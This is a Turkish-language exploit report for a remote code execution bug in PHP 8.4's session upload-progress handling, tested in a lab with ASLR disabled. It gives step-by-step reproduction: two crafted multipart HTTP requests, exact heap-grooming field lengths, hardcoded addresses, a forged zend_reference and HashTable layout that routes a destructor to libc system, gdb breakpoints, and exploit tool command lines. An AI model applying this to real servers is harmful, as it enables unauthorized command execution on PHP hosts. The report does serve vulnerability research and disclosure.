# Saf HTTP, hedef-tarafı PHP'siz no-ASLR RCE raporu

Tarih: 2026-10-21
Hedef: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (Debian 12 amd64 uzak lab)
Kısıtlar: **tamamen uzaktan, yalnızca HTTP; hedef webroot'a herhangi bir özel PHP dosyası yazılmaz**.
Hedef sayfası sıradan bir `index.php`:

```php
<?php
echo "OK\n";
```

Bu rapor yalnızca **no-ASLR** sonuçlarını kapsar. ASLR'nin iki yol analizi için bkz. `ASLR_PATHS.md`.

---

## 1. Sonuç

ASLR'nin kapalı olduğu lab worker'ında, **iki saf HTTP isteği** ile RCE aşıldı:

- İstek A: `session.upload_progress` büyük bir session'ı decode ederken OOM olur, istekler arası
  sarkan `PS(http_session_vars)` zend_reference'ı geride bırakır.
- İstek B: multipart alanının tahsis/serbest bıraktığı 56 baytlık ham (raw) buffer, eski
  reference'ın bulunduğu bloğu yeniden işgal eder ve eski 32 baytlık reference'ı sahte bir
  `zend_reference`'a çevirir; aynı zamanda **canlı** bir 192 baytlık zend_string ile fake
  HashTable'ı taşır. B'nin END cleanup'ı `php_session_track_init()` → `zval_ptr_dtor` →
  `zend_array_destroy` → `zend_hash_destroy`'ı çağırır, `pDestructor` libc `system`'e düşer.

Fiilen yürütülen:

```text
system("id>/tmp/p1")
```

proof (`/tmp/p1`, 54 bayt):

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

gdb kritik geri izleme (backtrace):

```text
#0  __libc_system (line=0x7ffff5e6e118 "id>/tmp/p1")
#1  zend_hash_destroy (ht=0x7ffff5e6e0d8)
#2  zend_array_destroy (ht=0x7ffff5e6e0d8)
#3  i_zval_ptr_dtor (zval_ptr=0x7ffff5e02328)
#4  zend_reference_destroy (ref=0x7ffff5e02320)
#5  php_session_track_init ()
#6  php_session_initialize ()
#7  php_session_rfc1867_cleanup ()
#8  php_session_rfc1867_callback ()
```

`system` döndükten sonra istek Zend MM'de abort olur (`zend_mm_realloc_heap` heap tutarsızlığı
tespit eder), ancak komut abort'tan önce zaten yürütülüp proof'u yazmıştır. worker ardından çöker;
bu, tek seferlik bir exploit için beklenen davranıştır.

---

## 2. Kök neden ve tetik noktası

- Açık konumu: `ext/session/session.c`'nin upload-progress yolu.
- A isteği, `php_request_startup` aşamasında `session.upload_progress`'in büyük bir session'ı
  decode etmesi nedeniyle OOM tetikler; bailout sonrası `modules_activated=0` olur, session'ın
  RSHUTDOWN'ı atlanır.
- Geriye kalan durum: `PS(http_session_vars)` bir **zend_reference**'tır, `val.value`'su
  A'da tahsis edilen session HashTable'ına işaret eder; bu reference A bittikten sonra da B'nin
  `php_session_track_init()`'i tarafından erişilir.
- B'nin END cleanup'ı `php_session_initialize()` → `php_session_track_init()`'i çağırır:
  1. `zend_delete_global_variable("_SESSION")` reference'ın refcount'unu 2'den 1'e düşürür;
  2. `zval_ptr_dtor(&PS(http_session_vars))` refcount 1 görür ve
     `zend_reference_destroy()`'i çağırır;
  3. `zend_reference_destroy()`, `ref->val` için (IS_ARRAY olarak forge ettiğimiz)
     `zend_array_destroy()`'i çağırır;
  4. fake HashTable'ın `pDestructor = system`'dir, `zend_hash_destroy()`
     `&bucket->val` (komut string'inin adresi) ile `system()`'i çağırır.

Tüm tetik, uygulama kodu yürütülmeden önce tamamlanır, uygulamanın herhangi bir session API'si
çağırması gerekmez.

---

## 3. İstek B'nin bellek yerleşimi

no-ASLR altında kararlı adresler:

| Nesne | Adres/offset |
|---|---|
| Eski zend_reference (sarkan) R0 | `0x7ffff5e02320` |
| R0'ı yeniden işgal eden 56B raw buffer başlangıcı | `R0-0x10` |
| fake HashTable'ı barındıran 192B zend_string'in data'sı | `0x7ffff5e6e0d8` (T+0x18) |
| libc `system` | `0x7ffff7d13490` |
| libphp base adresi (referans) | `0x7ffff47c0000` |

### 3.1 Eski reference'ı yeniden işgal eden raw buffer

multipart sıradan alanın değeri önce `multipart_buffer_read_body()` tarafından
`erealloc(NULL, len+1)`'in **ham buffer**'ına okunur, içeriği offset 0'dan başlar, callback/kayıttan
sonra ancak `efree()` edilir; serbest bırakıldıktan sonra içeriği hâlâ durur. Alan değeri uzunluğu
55 seçilir (56B tahsis, Zend MM bin 6).

B içinde "31 karakterlik alan adı + L=47" olan 7 priming alanı ile 56B key slotları tüketilir,
böylece sonraki L=55 alanının raw buffer'ı tam olarak `0x7ffff5e02310`'a (R0-0x10) düşer. Bu bloğun
56 baytı, eski 32B reference'ın R0 bölgesinin üzerine yazar:

```text
raw+0x10 (R0+0x00): gc: refcount=1, type=IS_REFERENCE (10)
raw+0x18 (R0+0x08): val.value = fake HashTable data adresi
raw+0x20 (R0+0x10): val.type  = 0x307 (IS_ARRAY_EX)
raw+0x28 (R0+0x18): zend_reference.sources = 0
```

`zend_reference_destroy()`, `sources.ptr == NULL` olmasını gerektirir; aksi hâlde release sürümünün
`ZEND_ASSUME`'u `__builtin_unreachable`/abort'a yol açar.

### 3.2 fake HashTable'ı barındıran canlı string

Serbest bırakılmış raw buffer fake HashTable'ı barındıramaz: serbest bırakıldıktan sonra allocator
blok offset 0'a `next_free_slot` yazar ve fake HashTable'ın `gc`'sinin üzerine yazar, bu da
`i_zval_ptr_dtor`'ın `GC_DELREF`'inin sıfıra inmemesine ve array dtor'a girmemesine yol açar.

Bunun yerine **canlı bir zend_string** kullanılır:

- Alan değeri uzunluğu 167 → `zend_string_alloc` boyutu 24+167+1=192, tam olarak bin 13 (192B).
- String, request shutdown'a kadar `$_POST`'ta tutulur; B'nin END cleanup'ı anında hâlâ canlıdır.
- String data'sı blok başlangıcı +24'ten başlar, içeriği tamamen alan değeri tarafından kontrol edilir.
- fake HashTable doğrudan data offset 0'a konur:

```text
data+0x00: gc refcount=1, type=IS_ARRAY (7)
data+0x08: flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8
data+0x10: arData = data+0x40
data+0x18: nNumUsed=1, nNumOfElements=1
data+0x20: nTableSize=8, nInternalPointer=0
data+0x28: nNextFreeElement=0
data+0x30: pDestructor = system
data+0x40: "id>/tmp/p1\0"
data+0x60: işaret 0x1122334455667788 (yalnızca hata ayıklama için)
```

`zend_hash_destroy()`, `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES`
dalını izler, `pDestructor(&p->val)`'i, yani `system(data+0x40)`'ı çağırır.

---

## 4. Çoğaltma adımları

Ortam:

- Apache prefork tek worker, no-ASLR başlatma:
  `setarch $(uname -m) -R /usr/sbin/apache2ctl -k start`
- PHP yapılandırması: `memory_limit=8M`, `session.upload_progress.cleanup=On`,
  `session.upload_progress.enabled=On`, `session.save_path=/tmp`,
  `session.use_strict_mode=0`, `display_errors=On`.
- webroot'ta yalnızca sıradan `index.php` var (`echo "OK\n"`, hiçbir session çağrısı yok).

İstek A (aynı dizindeki araç `send_a_ps.py`):

```bash
python3 send_a_ps.py 17 19 3 12
# boundary 17B, PHPSESSID 19B, progress key 3B, büyük alan 12MB
```

A'nın amacı: upload-progress decode sırasında OOM olmak, istekler arası sarkan reference bırakmak.
A bittikten sonra worker B'yi işlemeye devam edebilir (bu lab'da session'ın RSHUTDOWN'ı atlanır).

İstek B (`send_b_rce2.py`):

```bash
python3 send_b_rce2.py \
  7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
# N1=7 priming alanı; N2=2 adet L=55 fake-ref alanı
# HTDATA=fake HashTable data adresi; SYS=system adresi
```

B'nin multipart'ı:

- `PHPSESSID=attacksessionid0001`
- `PHP_SESSION_UPLOAD_PROGRESS=pwn`
- 7 × 31 karakterlik alan adı (`a000...`), değer = 167B fake HashTable
- 2 × kısa alan adı (`f00`,`f01`), değer = 55B fake reference
- boundary = `B`×10, sonunda normal kapanış

Kontrol:

```bash
cat /tmp/p1
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 4.1 Kritik gdb gözlem noktaları

```gdb
b php_session_track_init
# ps_globals.http_session_vars.value.ptr ve işaret ettiği fake reference'ı yazdır
b zend_reference_destroy if $rdi == 0x7ffff5e02320
b zend_array_destroy   if $rdi == 0x7ffff5e6e0d8
b zend_hash_destroy    if $rdi == 0x7ffff5e6e0d8
b system
```

Fiilen isabet edenler:

```text
REF rdi=0x7ffff5e02320
ARR T  ht=0x7ffff5e6e0d8
HASH T ht=0x7ffff5e6e0d8
SYSTEM rdi=0x7ffff5e6e118 [id>/tmp/p1]
```

---

## 5. Araçlar ve dosyalar

| Dosya | Amaç |
|---|---|
| `tools/send_a_ps.py` | A: upload-progress büyük alan OOM, sarkan reference bırakır |
| `tools/send_b_align.py` | B'nin alan uzunluğu/sayısı hizalama deneyi (56B raw buffer düşüş noktası arama) |
| `tools/send_b_rce2.py` | Nihai B: fake reference + canlı string fake HashTable + system |
| `tools/send_b_rce.py` | Erken sürüm (fake HT serbest bırakılmış raw buffer'a konur, gc free-list ile üzerine yazılır, kullanılamaz) |
| `logs/noaslr_rce.log` | Başarılı çalıştırmanın gdb/system/proof kaydı |

---

## 6. Sınırlar ve kenar durumlar

1. **Yalnızca no-ASLR**: R0, fake HT data, system adresleri hepsi sabit-kodludur (hardcoded).
   ASLR açılınca adresler değişir.
2. **memory_limit**: Bu lab A'nın kolayca OOM olması için 8M kullanır. Varsayılan
   `memory_limit=128M` iken A'nın 128M'yi aşan session verisi kurgulaması gerekir (uygulanabilir
   ama trafik büyük); `session.upload_progress` varsayılan açıktır, cleanup varsayılan On'dur.
3. **İstek B'den sonra worker abort olur**: `system` döndükten sonra `zend_hash_destroy`'ın
   `pefree(HT_GET_DATA_ADDR)`'i string'in iç işaretçisini serbest bırakır, Zend MM heap
   tutarsızlığı tespit eder ve abort eder. proof zaten yazılmıştır; aynı prosesi kullanmaya devam
   etmek gerekirse, fake HT'yi yasal olarak serbest bırakılabilir bir tahsis bloğuna koymak ya da
   nTableMask'ı düzeltip `HT_GET_DATA_ADDR`'ı tahsis başlangıcı yapmak gerekir.
4. **B'nin kesin 56B/192B tahsis sırasına bağlıdır**: N1=7, alan adı uzunluğu 31, L=167/L=55,
   boundary 10 fiilen bulunmuş bir kombinasyondur; PHP build'i/yapılandırması/istek sırası
   değişince yeniden kalibrasyon gerekir.
5. **Uygulama koduna dokunmaz**: hedef sayfası herhangi bir session çağrısı gerektirmez; tetik
   RINIT/parse aşamasındadır.
